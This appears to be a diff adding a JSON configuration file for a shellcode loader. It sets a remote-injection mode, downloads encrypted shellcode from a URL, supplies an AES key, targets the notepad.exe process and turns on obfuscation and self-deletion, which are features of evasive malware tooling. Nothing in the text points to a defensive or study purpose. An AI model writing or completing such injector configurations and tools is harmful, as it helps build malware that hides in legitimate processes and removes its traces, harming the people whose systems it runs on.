@@ -1,0 +1,10 @@
+{
+  "mode": "inject_remote",
+  "source": "url",
+  "url": "http://localhost:8000/encrypted_shellcode.bin",
+  "path": "payloads/shellcode.bin",
+  "aes_key": "0123456789abcdef",
+  "target_process": "notepad.exe",
+  "obfuscated": true,
+  "self_delete": true
+}
